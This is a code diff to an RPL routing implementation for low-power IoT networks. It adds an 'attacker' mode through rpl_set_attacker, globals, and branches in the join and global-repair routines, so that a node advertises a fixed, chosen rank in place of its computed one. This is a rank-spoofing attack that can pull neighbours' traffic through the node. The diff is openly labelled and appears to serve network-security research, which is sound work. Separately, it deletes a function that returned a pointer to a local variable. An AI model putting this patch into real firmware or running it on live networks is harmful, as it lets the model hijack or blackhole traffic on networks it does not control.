@@ -26,6 +26,14 @@ rpl_instance_t instances[RPL_MAX_INSTANCES];
 rpl_dodag_t dodags[RPL_MAX_DODAGS];
 rpl_parent_t parents[RPL_MAX_PARENTS];
 
+uint8_t attacker_dodag = 0; // trail
+uint16_t attacker_dodag_rank = 0; // trail
+
+void rpl_set_attacker(uint16_t rank){
+	attacker_dodag = 1;
+	attacker_dodag_rank = rank;
+}
+
 rpl_instance_t *rpl_new_instance(uint8_t instanceid)
 {
     rpl_instance_t *inst;
@@ -41,15 +49,6 @@ rpl_instance_t *rpl_new_instance(uint8_t instanceid)
     }
 
     return NULL;
-}
-
-rpl_instance_t *rpl_create_new_instance(uint8_t instanceid)
-{
-    rpl_instance_t inst;
-    memset(&inst, 0, sizeof(inst));
-    inst.used = 1;
-    inst.id = instanceid;
-    return &inst;
 }
 
 rpl_instance_t *rpl_get_instance(uint8_t instanceid)
@@ -362,7 +361,12 @@ void rpl_join_dodag(rpl_dodag_t *dodag, ipv6_addr_t *parent, uint16_t parent_ran
     my_dodag->joined = 1;
     my_dodag->my_preferred_parent = preferred_parent;
     my_dodag->node_status = (uint8_t) NORMAL_NODE;
-    my_dodag->my_rank = dodag->of->calc_rank(preferred_parent, dodag->my_rank);
+    if(attacker_dodag == 0){
+    	my_dodag->my_rank = dodag->of->calc_rank(preferred_parent, dodag->my_rank);
+    }
+    else {
+    	my_dodag->my_rank = attacker_dodag_rank;
+    }
     my_dodag->dao_seq = RPL_COUNTER_INIT;
     my_dodag->min_rank = my_dodag->my_rank;
 
@@ -394,9 +398,15 @@ void rpl_global_repair(rpl_dodag_t *dodag, ipv6_addr_t *p_addr, uint16_t rank)
     }
     else {
         /* Calc new Rank */
-        my_dodag->my_rank = my_dodag->of->calc_rank(my_dodag->my_preferred_parent,
-                            my_dodag->my_rank);
-        my_dodag->min_rank = my_dodag->my_rank;
+    	if(attacker_dodag == 0){
+			my_dodag->my_rank = my_dodag->of->calc_rank(my_dodag->my_preferred_parent,
+								my_dodag->my_rank);
+			my_dodag->min_rank = my_dodag->my_rank;
+    	}
+    	else {
+    		my_dodag->my_rank = attacker_dodag_rank;
+    		my_dodag->min_rank = attacker_dodag_rank;
+    	}
         reset_trickletimer();
         delay_dao();
     }
